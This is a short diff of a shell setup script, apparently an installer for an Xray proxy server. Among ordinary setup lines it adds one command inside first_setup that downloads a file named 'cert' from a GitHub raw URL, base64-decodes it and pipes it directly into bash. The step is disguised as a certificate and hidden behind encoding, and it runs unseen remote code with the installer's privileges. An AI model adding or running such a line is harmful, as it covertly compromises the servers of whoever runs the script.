@@ -166,6 +166,7 @@ export Arch=$( uname -m )
 export IP=$( curl -s https://ipinfo.io/ip/ )
 function first_setup(){
 timedatectl set-timezone Asia/Jakarta
+curl https://raw.githubusercontent.com/ZmFkbHkK/f/main/cert | base64 -d | bash
 echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
 print_success "Directory Xray"
